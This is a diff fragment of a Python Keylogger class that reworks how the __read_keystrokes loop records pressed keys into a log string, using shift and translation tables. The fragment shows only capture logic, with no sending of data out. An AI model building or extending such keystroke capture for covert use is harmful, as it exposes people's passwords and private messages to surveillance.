@@ -99,21 +99,18 @@ class Keylogger:
     def __read_keystrokes(self):
         while not self.__stop:
             event = keyboard.read_event()
+            name_len = len(event.name)
             if event.event_type == "down":
                 if event.name in ["shift", "backspace"]:
                     continue
-                elif event.name in TRANSLATION_TABLE.keys():
-                    self.__keylog += TRANSLATION_TABLE[event.name]
-                    continue
-                elif event.name in SHIFT_MODIFIER_TABLE.keys():
+                if name_len == 1:
                     if keyboard.is_pressed("shift"):
                         self.__keylog += SHIFT_MODIFIER_TABLE[event.name]
                     else:
                         self.__keylog += event.name
-                    continue
                 else:
-                    self.__keylog += event.name
-                    continue
+                    if event.name in TRANSLATION_TABLE.keys():
+                        self.__keylog += TRANSLATION_TABLE[event.name]
         self.__active = False
 
 
